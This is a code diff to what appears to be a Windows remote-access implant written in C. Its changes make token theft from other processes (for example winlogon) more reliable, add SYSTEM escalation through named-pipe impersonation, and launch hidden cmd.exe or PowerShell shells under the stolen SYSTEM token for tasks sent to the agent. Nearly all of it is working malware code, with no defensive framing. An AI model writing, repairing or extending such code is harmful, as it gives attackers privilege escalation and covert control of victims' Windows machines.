@@ -197,7 +197,8 @@ static char* run_shell(const char *cmd) {
                 imp_err = GetLastError();
             } else {
                 wchar_t wargs_retry[4096];
-                memcpy(wargs_retry, wargs_token, sizeof(wargs_retry));
+                MultiByteToWideChar(CP_ACP, 0, shell_args, -1, wargs_retry,
+                                    (int)(sizeof(wargs_retry) / sizeof(wargs_retry[0])));
                 proc_ok = CreateProcessWithTokenW(hSysTok, 0, cmd_app, wargs_retry,
                     CREATE_NO_WINDOW, NULL, cmd_cwd, &si, &pi);
                 if (proc_ok) {
@@ -1183,6 +1184,13 @@ static char *gs_try_steal(DWORD pid, const char *name) {
     }
     if (!ImpersonateLoggedOnUser(hDup)) { CloseHandle(hDup); if (hPrim) CloseHandle(hPrim); return NULL; }
     CloseHandle(hDup);
+    /* Normalise the token's session to our own session so that cmd.exe can
+       initialise user32.dll.  A cross-session token (e.g. winlogon = Session 1
+       while the agent runs in Session 0) causes STATUS_DLL_INIT_FAILED.
+       Thread is now impersonating SYSTEM → SeTcbPrivilege is available. */
+    DWORD cur_session = 0;
+    ProcessIdToSessionId(GetCurrentProcessId(), &cur_session);
+    SetTokenInformation(hPrim, TokenSessionId, &cur_session, sizeof(DWORD));
     HANDLE old = (HANDLE)InterlockedExchangePointer((PVOID*)&g_system_token, hPrim);
     if (old) CloseHandle(old);
     char *out = (char*)malloc(128);
@@ -1291,7 +1299,11 @@ static char *get_system(void) {
     {
         HANDLE hThr = NULL, hPrim = NULL;
         if (OpenThreadToken(GetCurrentThread(), TOKEN_DUPLICATE | TOKEN_ALL_ACCESS, FALSE, &hThr)) {
-            DuplicateTokenEx(hThr, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenPrimary, &hPrim);
+            if (!DuplicateTokenEx(hThr, TOKEN_ALL_ACCESS, NULL,
+                                  SecurityDelegation, TokenPrimary, &hPrim)) {
+                DuplicateTokenEx(hThr, TOKEN_ALL_ACCESS, NULL,
+                                 SecurityImpersonation, TokenPrimary, &hPrim);
+            }
             CloseHandle(hThr);
         }
         if (!hPrim) {
@@ -1301,6 +1313,11 @@ static char *get_system(void) {
             snprintf(e, 96, "[-] T1+T2 failed (DuplicateTokenEx err %lu)", err);
             return e;
         }
+        /* Same session normalisation as T1: thread is SYSTEM via
+           ImpersonateNamedPipeClient → SeTcbPrivilege is available. */
+        DWORD cur_session = 0;
+        ProcessIdToSessionId(GetCurrentProcessId(), &cur_session);
+        SetTokenInformation(hPrim, TokenSessionId, &cur_session, sizeof(DWORD));
         HANDLE old = (HANDLE)InterlockedExchangePointer((PVOID*)&g_system_token, hPrim);
         if (old) CloseHandle(old);
     }
@@ -3167,24 +3184,84 @@ void dispatch_task(AgentTask *task) {
         char shell_name[64] = {0};
         json_get_str(args,"shell",shell_name,sizeof(shell_name),"cmd");
         char shell_cmd[256];
-        if (_stricmp(shell_name,"powershell") == 0)
+        if (_stricmp(shell_name,"powershell") == 0 || _stricmp(shell_name,"ps") == 0)
             strncpy(shell_cmd,"powershell.exe",sizeof(shell_cmd)-1);
         else
             strncpy(shell_cmd,"cmd.exe",sizeof(shell_cmd)-1);
         SECURITY_ATTRIBUTES sa2 = {sizeof(SECURITY_ATTRIBUTES),NULL,TRUE};
         HANDLE hStdinR=NULL,hStdinW=NULL,hStdoutR=NULL,hStdoutW=NULL;
-        CreatePipe(&hStdinR,&hStdinW,&sa2,0);
-        CreatePipe(&hStdoutR,&hStdoutW,&sa2,0);
+        if (!CreatePipe(&hStdinR,&hStdinW,&sa2,0) ||
+            !CreatePipe(&hStdoutR,&hStdoutW,&sa2,0)) {
+            if (hStdinR) CloseHandle(hStdinR); if (hStdinW) CloseHandle(hStdinW);
+            if (hStdoutR) CloseHandle(hStdoutR); if (hStdoutW) CloseHandle(hStdoutW);
+            agent_send_result(task->id,"","CreatePipe failed"); return;
+        }
         SetHandleInformation(hStdinW,HANDLE_FLAG_INHERIT,0);
         SetHandleInformation(hStdoutR,HANDLE_FLAG_INHERIT,0);
-        STARTUPINFOA isi = {0}; isi.cb=sizeof(isi);
+        STARTUPINFOW isi = {0}; isi.cb=sizeof(isi);
         isi.hStdInput=hStdinR; isi.hStdOutput=hStdoutW; isi.hStdError=hStdoutW;
         isi.dwFlags=STARTF_USESTDHANDLES|STARTF_USESHOWWINDOW; isi.wShowWindow=SW_HIDE;
         PROCESS_INFORMATION ipi = {0};
-        if (!CreateProcessA(NULL,shell_cmd,NULL,NULL,TRUE,CREATE_NO_WINDOW,NULL,NULL,&isi,&ipi)) {
+        WCHAR shell_app_w[MAX_PATH] = {0};
+        WCHAR shell_args_w[256] = {0};
+        const char *shell_app = (_stricmp(shell_name,"powershell") == 0 || _stricmp(shell_name,"ps") == 0)
+            ? "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
+            : "C:\\Windows\\System32\\cmd.exe";
+        const char *shell_args = (_stricmp(shell_name,"powershell") == 0 || _stricmp(shell_name,"ps") == 0)
+            ? "-NoLogo -NoProfile -NonInteractive" : "/Q";
+        MultiByteToWideChar(CP_ACP,0,shell_app,-1,shell_app_w,MAX_PATH);
+        MultiByteToWideChar(CP_ACP,0,shell_args,-1,shell_args_w,
+                            (int)(sizeof(shell_args_w)/sizeof(shell_args_w[0])));
+        HANDLE hSysTok = (HANDLE)InterlockedCompareExchangePointer(
+            (PVOID*)&g_system_token, NULL, NULL);
+        BOOL proc_ok = FALSE;
+        DWORD with_token_err = 0, as_user_err = 0, imp_err = 0;
+        if (hSysTok) {
+            HANDLE hSelf = NULL;
+            if (OpenProcessToken(GetCurrentProcess(),
+                                 TOKEN_ADJUST_PRIVILEGES|TOKEN_QUERY,&hSelf)) {
+                enable_privilege(hSelf,"SeImpersonatePrivilege");
+                enable_privilege(hSelf,"SeIncreaseQuotaPrivilege");
+                enable_privilege(hSelf,"SeAssignPrimaryTokenPrivilege");
+                CloseHandle(hSelf);
+            }
+            enable_privilege(hSysTok,"SeImpersonatePrivilege");
+            enable_privilege(hSysTok,"SeIncreaseQuotaPrivilege");
+            enable_privilege(hSysTok,"SeAssignPrimaryTokenPrivilege");
+            proc_ok = CreateProcessWithTokenW(hSysTok,0,shell_app_w,shell_args_w,
+                CREATE_NO_WINDOW,NULL,L"C:\\Windows\\System32",&isi,&ipi);
+            if (!proc_ok) with_token_err = GetLastError();
+            if (!proc_ok) {
+                WCHAR shell_args_user[256];
+                memcpy(shell_args_user,shell_args_w,sizeof(shell_args_user));
+                proc_ok = CreateProcessAsUserW(hSysTok,shell_app_w,shell_args_user,
+                    NULL,NULL,TRUE,CREATE_NO_WINDOW,NULL,L"C:\\Windows\\System32",
+                    &isi,&ipi);
+                if (!proc_ok) as_user_err = GetLastError();
+            }
+            if (!proc_ok) {
+                if (ImpersonateLoggedOnUser(hSysTok)) {
+                    WCHAR retry_args[256];
+                    MultiByteToWideChar(CP_ACP,0,shell_args,-1,retry_args,
+                                        (int)(sizeof(retry_args)/sizeof(retry_args[0])));
+                    proc_ok = CreateProcessWithTokenW(hSysTok,0,shell_app_w,retry_args,
+                        CREATE_NO_WINDOW,NULL,L"C:\\Windows\\System32",&isi,&ipi);
+                    if (!proc_ok) with_token_err = GetLastError();
+                    RevertToSelf();
+                } else {
+                    imp_err = GetLastError();
+                }
+            }
+        } else {
+            proc_ok = CreateProcessW(shell_app_w,shell_args_w,NULL,NULL,TRUE,
+                CREATE_NO_WINDOW,NULL,L"C:\\Windows\\System32",&isi,&ipi);
+            if (!proc_ok) with_token_err = GetLastError();
+        }
+        if (!proc_ok) {
             CloseHandle(hStdinR); CloseHandle(hStdinW);
             CloseHandle(hStdoutR); CloseHandle(hStdoutW);
-            char e[64]; snprintf(e,sizeof(e),"CreateProcess failed %lu",GetLastError());
+            char e[192]; snprintf(e,sizeof(e),"CreateProcess shell failed; WithToken=%lu; AsUser=%lu; Impersonate=%lu",
+                                   with_token_err,as_user_err,imp_err);
             agent_send_result(task->id,"",e); return;
         }
         CloseHandle(ipi.hThread);
